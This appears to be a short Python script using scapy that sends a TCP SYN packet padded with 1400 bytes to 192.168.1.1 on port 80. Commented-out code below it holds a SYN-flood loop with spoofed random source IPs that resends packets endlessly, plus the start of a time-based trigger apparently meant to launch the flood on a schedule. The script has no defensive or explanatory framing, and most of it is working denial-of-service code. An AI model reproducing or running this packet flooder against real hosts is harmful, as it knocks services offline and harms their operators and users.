import time;
from scapy.all import *

saved_pc ="192.168.1.1"
saved_port = 80
ip= IP(dst=saved_pc)
tcp = TCP(sport=RandShort(), dport=saved_port, flags="S")
raw = Raw(b"X"*1400)
p = ip / tcp / raw
send(p)

#
# msg ="ON"
# localtime = time.asctime( time.localtime(time.time()) )
# print ("Local current time :", localtime)
# print(type(localtime))
#
# print(localtime[11]+localtime[12])
#
# if localtime[8]+localtime[9]=="16" and localtime[11]+localtime[12]=="14" and msg!="OFF": #runs the script forever (until a turn off is recived)



        #do this

# from scapy.all import *
#
#
#
# target_ip = "192.168.0.1"
# target_port = 80
# ip = IP(src=RandIP(), dst=target_ip)
# tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
# raw = Raw(b"X"*1400)
# p = ip / tcp / raw
# send(p, loop=1)
#
